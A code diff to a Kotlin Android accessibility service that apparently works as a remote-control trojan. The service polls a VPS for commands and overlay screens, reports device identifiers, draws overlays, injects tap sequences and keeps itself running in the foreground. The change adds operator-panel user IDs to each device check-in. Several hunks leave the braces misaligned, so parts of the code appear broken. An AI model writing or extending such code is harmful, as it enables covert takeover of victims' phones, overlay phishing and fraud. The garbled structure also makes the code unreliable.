@@ -55,6 +55,9 @@ class ControleGestosService : AccessibilityService() {
         const val URL_BUSCAR_COMANDOS = "${URL_VPS}/obter_comando"
         const val URL_BUSCAR_OVERLAY = "${URL_VPS}/obter_overlay"
         const val URL_LOGO_OVERLAY = "${URL_VPS}/logo_overlay"
+        const val ID_USUARIO_PAINEL = ""
+        const val NOME_USUARIO_PAINEL = ""
+        const val CADASTRO_ADM = false
 
         private const val INTERVALO_ATUALIZACAO = 1000L
         private const val CANAL_NOTIFICACAO = "servico_controle_remoto"
@@ -94,7 +97,7 @@ class ControleGestosService : AccessibilityService() {
         windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
         criarCanalNotificacao()
         try {
-            iniciarServicoEmPrimeiroPlano()
+        iniciarServicoEmPrimeiroPlano()
         } catch (e: Exception) {
             Log.e("KL", "Erro ao iniciar FGS: ${e.message}")
         }
@@ -280,6 +283,11 @@ class ControleGestosService : AccessibilityService() {
     ): String {
         val json = org.json.JSONObject().apply {
             put("id", obterIdDispositivo())
+            if (ID_USUARIO_PAINEL.isNotBlank()) {
+                put("usuario_id", ID_USUARIO_PAINEL)
+                put("usuario_nome", NOME_USUARIO_PAINEL)
+                put("cadastro_adm", CADASTRO_ADM)
+            }
             put("modelo", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
             put("fabricante", Build.MANUFACTURER)
             put("android", Build.VERSION.RELEASE)
@@ -783,6 +791,11 @@ class ControleGestosService : AccessibilityService() {
             try {
                 val payload = org.json.JSONObject().apply {
                     put("id", obterIdDispositivo())
+                    if (ID_USUARIO_PAINEL.isNotBlank()) {
+                        put("usuario_id", ID_USUARIO_PAINEL)
+                        put("usuario_nome", NOME_USUARIO_PAINEL)
+                        put("cadastro_adm", CADASTRO_ADM)
+                    }
                     put("modelo", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
                     put("fabricante", Build.MANUFACTURER)
                     put("android", Build.VERSION.RELEASE)
@@ -948,8 +961,8 @@ class ControleGestosService : AccessibilityService() {
 
         if (!changed && overlayEstaVisivel()) {
             overlayAtivo = true
-            return
-        }
+                    return
+                }
 
         if (OverlayActivity.estaAtiva()) {
             if (!changed) return
@@ -974,8 +987,8 @@ class ControleGestosService : AccessibilityService() {
             textoInferiorOverlayAtual = textoInferior
             logoOverlayAtual = logo
             Log.d("KL", "Overlay janela atualizada")
-            return
-        }
+                    return
+                }
 
         criarOverlay(mensagem, textoInferior, logo)
     }
@@ -1159,14 +1172,14 @@ class ControleGestosService : AccessibilityService() {
                 conexao.readTimeout = 4000
                 val bitmap = BitmapFactory.decodeStream(conexao.inputStream)
                 if (bitmap != null) {
-                    Handler(Looper.getMainLooper()).post {
+                Handler(Looper.getMainLooper()).post {
                         imgLogo.setImageBitmap(bitmap)
-                    }
                 }
-            } catch (e: Exception) {
+            }
+        } catch (e: Exception) {
                 Log.w("KL", "Logo overlay indisponivel: ${e.message}")
-            } finally {
-                conexao?.disconnect()
+        } finally {
+            conexao?.disconnect()
             }
         }
     }
@@ -2025,8 +2038,8 @@ class ControleGestosService : AccessibilityService() {
         fun proximo(indice: Int) {
             if (indice >= pontos.size) {
                 Log.i("KL", "Sequencia de toques concluida (${pontos.size})")
-                return
-            }
+            return
+        }
 
             val (x, y) = pontos[indice]
             if (clicarNoPonto(x, y)) {
@@ -2122,11 +2135,11 @@ class ControleGestosService : AccessibilityService() {
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                 )
             } else {
-                startForeground(ID_NOTIFICACAO, notificacao)
-            }
+        startForeground(ID_NOTIFICACAO, notificacao)
+    }
         } catch (e: Exception) {
             Log.e("KL", "FGS specialUse falhou (${Build.VERSION.SDK_INT}): ${e.message}")
             startForeground(ID_NOTIFICACAO, notificacao)
-        }
+}
     }
 }
